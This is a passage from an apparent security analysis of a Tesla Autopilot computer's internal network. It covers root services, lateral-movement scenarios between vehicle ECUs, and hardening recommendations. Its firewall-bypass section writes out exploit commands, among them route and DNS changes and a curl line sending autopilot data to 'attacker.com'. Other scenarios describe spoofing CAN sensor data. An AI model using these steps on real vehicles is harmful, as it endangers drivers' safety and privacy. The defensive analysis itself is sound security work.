| **50051** | vision_graph gRPC | gRPC API abuse | 🟠 HIGH - Vision pipeline control |
| **2049** | NFS | Filesystem export | 🔴 **CRITICAL** - Remote file access |

### 7.2 Privilege Boundaries

#### User/Group Hierarchy

```
root (UID 0)
  ├─ autopilot (GID 200)  - Core autopilot services
  ├─ canrx                - CAN reception
  ├─ metrics              - Metrics collector
  ├─ uiserver             - UI server
  ├─ hermes               - Telemetry uploader
  ├─ mapmanager           - Map manager (firewall restricted)
  └─ (other service users)
```

**Key Groups:**
- **autopilot** - Access to `/autopilot/*` data
- **ipc** - Shared memory / IPC access
- **rtdv** - Real-time data viewer
- **realtime** - Real-time scheduling priority
- **log** - Access to `/var/log/*`

#### File System Permissions

```
/autopilot/       drwxr-x--- root autopilot
/home/factory/    drwxr-xr-x root root
/home/telemetry/  drwxr-xr-x root root
/var/log/         drwxr-xr-x root root
/var/ipc/         drwxrwxrwx root root  (⚠️ World-writable)
```

**⚠️ Security Issue:** `/var/ipc/` is world-writable for Unix sockets

#### Root Services

The following services run as **root**:
- `/usr/bin/service_api` (both 8901 and 8081)
- `/opt/autopilot/bin/updater` (25974, 28496)
- `/usr/sbin/sshd` (22)
- `/sbin/rpcbind` (111 - NFS portmapper)
- `/usr/sbin/nfsd` (2049 - NFS daemon)

**⚠️ Exploitation of any root service = full APE compromise**

### 7.3 Attack Scenarios

#### Scenario 1: MCU → APE Lateral Movement

```
Attacker compromises MCU (192.168.90.100)
  ├─ Access APE service-api (8901) over HTTP
  │  └─ Exploit /factory_reset or /factory/enter endpoints
  │     └─ Trigger factory mode
  │        └─ Expose development firewall rules
  │           └─ Access NFS (2049), visualizer (7700), logs (8888)
  │
  ├─ Send crafted CAN data via UDP 31416
  │  └─ Inject fake sensor readings
  │     └─ Manipulate autopilot behavior
  │
  └─ Connect to service-api-tls (8081) with stolen cert
     └─ Access authenticated diagnostic endpoints
        └─ Upload malicious calibration data
```

#### Scenario 2: APE → MCU Lateral Movement

```
Attacker compromises APE (192.168.90.103)
  ├─ Hijack mapmanager UID
  │  └─ Access MCU autopilot-api (8900)
  │     └─ Inject malicious map data
  │        └─ Mislead navigation
  │
  ├─ Connect to MCU SNI proxy (8443)
  │  └─ Tunnel malicious HTTPS traffic
  │     └─ Exfiltrate data to external C2
  │
  ├─ Add new default route (bypass MCU firewall)
  │  └─ route add default gw <external_gateway>
  │     └─ Direct internet access
  │
  └─ Modify /etc/autopilot_hosts
     └─ Redirect Tesla API calls to attacker server
        └─ Man-in-the-middle Tesla backend communication
```

#### Scenario 3: Development/Factory Mode Exploitation

```
Vehicle in factory mode (/sbin/detect-ecu-unfused returns true)
  ├─ Firewall_dev rules applied
  │  └─ Port 7700 (visualizer video) exposed
  │     └─ Stream live camera feeds from vehicle
  │        └─ PRIVACY VIOLATION
  │
  ├─ Port 2049 (NFS) exposed
  │  └─ Mount APE filesystem remotely
  │     └─ Read /autopilot/, /var/log/, /home/factory/
  │        └─ Exfiltrate calibration data, logs, telemetry
  │
  └─ Port 8888 (logdash) exposed
     └─ Retrieve logs via HTTP
        └─ Gather intelligence on vehicle operations
```

---

## 8. Authentication & TLS Implementation

### 8.1 service-api-tls (Port 8081)

**Certificate Sources:**

1. **Production (fused ECUs):**
   - **Board certificate:** `/var/lib/board_creds/board.crt`
   - **Private key:** `/var/lib/board_creds/board.key`
   - **CA bundle:** `$TESLA_CERTIFICATES_CURRENT_COMBINED_PRODUCT_ACCESS`

2. **TPM-backed keys:**
   ```bash
   if grep -q "BEGIN FSD TPM PRIVATE KEY" "$KEY"; then
           ENGINE=fsdtpm
   fi
   ```
   - Private key stored in TPM (Trusted Platform Module)
   - `ENGINE=fsdtpm` uses OpenSSL engine for TPM access

3. **Fallback (unfused/dev ECUs):**
   - Self-signed certificate generated at boot
   - Subject: `/CN=$ID/OU=Tesla Motors/O=Tesla/L=Palo Alto/ST=California/C=US`
   - `$ID` = output of `videntify` command
   - Validity: 365 days

**Client Authentication:**

```bash
ARGS_OID_ENV="--oid-env $TESLA_CERTIFICATES_EKU_PRODUCT_ACCESS_CLIENT_AUTH_PROD"
if is-development-ape || is-in-factory; then
        ARGS_OID_ENV="${ARGS_OID_ENV} --oid-env $TESLA_CERTIFICATES_EKU_PRODUCT_ACCESS_CLIENT_AUTH_ENG"
fi
```

**Extended Key Usage (EKU) OIDs:**
- Production: `$TESLA_CERTIFICATES_EKU_PRODUCT_ACCESS_CLIENT_AUTH_PROD`
- Development/Factory: `$TESLA_CERTIFICATES_EKU_PRODUCT_ACCESS_CLIENT_AUTH_ENG`

**Authorization:**

```bash
--id-all tesla:motors:das:all
$ARGS_ID_DEVICE
```

- Requires client cert with principal `tesla:motors:das:all`
- Additional device-specific principals from `/sbin/authorized-principals`

**⚠️ Security Issue:** 
- Fallback to self-signed certs in dev mode
- If attacker can reset board credentials, TLS falls back to insecure mode

### 8.2 SSH (Port 22)

**Configuration:** Standard OpenSSH
- **Moduli:** `/etc/ssh/moduli` (DH parameters for key exchange)
- **Authorized principals:** `/sbin/authorized-principals` script

**Public key authentication only** (no password auth)

---

## 9. Firewall Bypass Techniques

### 9.1 UID Hijacking (mapmanager)

**Vulnerability:** `mapmanager` UID is only restricted by iptables owner matching

**Exploit:**
```bash
# As root on compromised APE
su - mapmanager -c "curl http://192.168.90.100:8900/api/endpoint"
```

**Result:** Access to MCU autopilot API (8900) and SNI proxy (8443)

### 9.2 Conntrack Hijacking

**Vulnerability:** `-m conntrack --ctstate RELATED,ESTABLISHED` allows return traffic

**Exploit:**
```bash
# Attacker sends spoofed UDP packet from 192.168.90.104:27694 → APE:27694
# APE creates conntrack entry
# Attacker can now send arbitrary UDP to APE from 192.168.90.104
```

**Result:** Bypass source IP restrictions on canrx ports

### 9.3 Multicast Abuse

**Vulnerability:** APE-A allows multicast from itself (224.0.0.154:5424)

```iptables
-A INPUT -i eth0 -s 192.168.90.103 -d 224.0.0.154 -p udp --dport 5424 -j ACCEPT
```

**Exploit:**
```bash
# From compromised MCU (192.168.90.100)
# Spoof source IP to 192.168.90.103
# Send multicast packets to 224.0.0.154:5424 → APE
```

**Result:** Inject into clip-logger multicast stream

### 9.4 Egress Filtering Bypass

**Vulnerability:** `-A OUTPUT ACCEPT` allows all outbound connections

**Exploit:**
```bash
# As root on APE
ip route add default via <external_gateway>
# Install custom DNS resolver
echo "nameserver 8.8.8.8" > /etc/resolv.conf
# Exfiltrate data
curl http://attacker.com/exfil -d @/autopilot/sensitive_data
```

**Result:** Complete firewall bypass for data exfiltration

---

## 10. Security Recommendations

### 10.1 Firewall Hardening

#### **10.1.1 Egress Filtering**

```iptables
# Replace OUTPUT ACCEPT with default DROP
:OUTPUT DROP [0:0]

# Allow specific outbound connections
-A OUTPUT -o lo -j ACCEPT
-A OUTPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A OUTPUT -d 192.168.90.100 -p tcp --dport 8900 -m owner --uid-owner mapmanager -j ACCEPT
-A OUTPUT -d 192.168.90.100 -p tcp --dport 8443 -m owner --uid-owner mapmanager -j ACCEPT
-A OUTPUT -d 192.168.90.100 -p tcp --dport 8443 -m owner --uid-owner hermes -j ACCEPT
```

#### **10.1.2 Restrict service-api to MCU only**

```iptables
# Replace:
-A INPUT -p tcp --dport 8901 -j ACCEPT

# With:
-A INPUT -i eth0 -s 192.168.90.100 -p tcp --dport 8901 -j ACCEPT
```

#### **10.1.3 Disable Development Firewall in Production**

```bash
# Ensure /sbin/detect-ecu-unfused returns false on production vehicles
# Remove /etc/firewall_dev entirely
```

### 10.2 Service Hardening

#### **10.2.1 Add TLS to service-api (8901)**

- **Remove plaintext HTTP service**
- **Force all clients to use 8081 (TLS)**
- **Require mutual TLS authentication**

#### **10.2.2 Restrict SSH Access**

```iptables
# Limit SSH to MCU only
-A INPUT -i eth0 -s 192.168.90.100 -p tcp --dport 22 -j ACCEPT
```

#### **10.2.3 Implement Network Namespaces**

```bash
# Isolate mapmanager in dedicated network namespace
ip netns add mapmanager
ip netns exec mapmanager /opt/autopilot/bin/map_manager
```

**Benefit:** Iptables UID matching becomes redundant; namespace provides true isolation

### 10.3 Authentication Improvements

#### **10.3.1 Add Authentication to apeb-file-server (8902)**

- **Implement shared secret or mTLS**
- **Verify APE-B identity before serving filesystem**

#### **10.3.2 Cryptographic Signing for CAN Data**

- **Sign UDP packets from Aurix (192.168.90.104)**
- **Verify HMAC before processing in canrx**

### 10.4 Monitoring & Detection

#### **10.4.1 Firewall Audit Logging**

```iptables
-A INPUT -j LOG --log-prefix "APE_FW_DROP: " --log-level 4
-A OUTPUT -j LOG --log-prefix "APE_FW_EGRESS: " --log-level 4
```

#### **10.4.2 Anomaly Detection**

- Monitor for unexpected outbound connections
- Alert on factory mode transitions
- Log all service-api (8901) requests

### 10.5 Privilege Separation

#### **10.5.1 Drop Root Privileges in service_api**

```c
// In /usr/bin/service_api startup
setuid(service_api_uid);
setgid(service_api_gid);
```

**Benefit:** RCE in service_api no longer grants root access

#### **10.5.2 AppArmor Profiles**

```
# /etc/apparmor.d/usr.bin.service_api
/usr/bin/service_api {
  capability net_bind_service,
  network inet stream,
  /etc/build-date r,
  deny /autopilot/** rwx,
  deny /home/factory/** rwx,
}
```

---

## Appendix A: Complete /etc/hosts

```
127.0.0.1       localhost
192.168.90.103  ap
192.168.90.105  ap-b
192.168.91.103  ap-macsec
192.168.91.105  ap-b-macsec
192.168.92.103  ap-eth0.1
192.168.92.105  ap-b-eth0.1
192.168.95.103  ap-eth1
192.168.95.105  ap-b-eth1
192.168.96.103  ap-eth1-macsec
192.168.96.105  ap-b-eth1-macsec
192.168.97.103  ap-eth1.1
192.168.97.105  ap-b-eth1.1
192.168.90.104  lb
192.168.90.100  cid ice
192.168.90.101  ic
192.168.90.102  gtw
127.0.0.1       firmware.vn.teslamotors.com
```

---

## Appendix B: Hermes Configuration

**Source:** `/etc/hermes.vars`

```bash
HERMES_PLATFORM_ARGS="-sniproxy-ip=192.168.90.100 -sniproxy-port-wifi-only=8444"
```

**SNI Proxy Configuration:**
- **IP:** 192.168.90.100 (MCU)
- **Port:** 8444 (WiFi only)
- **Port:** 8443 (default)

**Purpose:** Tunnel HTTPS traffic through MCU to Tesla backend

---

## Appendix C: References

### Cross-Referenced Documents
- [04-network-ports-firewall.md](04-network-ports-firewall.md) - MCU network architecture
- [25-network-attack-surface.md](25-network-attack-surface.md) - Vehicle-wide attack surface
- [43-ape-network-services.md](43-ape-network-services.md) - APE services overview

### External Research
- **Keen Security Lab:** Tesla APE root exploits (DEF CON 2020)
- **McAfee ATR:** Tesla Model 3 network analysis (2020)
- **Tencent:** Tesla Autopilot sensor spoofing (2019)

---

**Document END**

**Analysis Completion:** February 3, 2026 04:52 UTC  
**Next Steps:** Cross-reference with Gateway (.102) and Modem (.60) network analysis for complete vehicle network map.
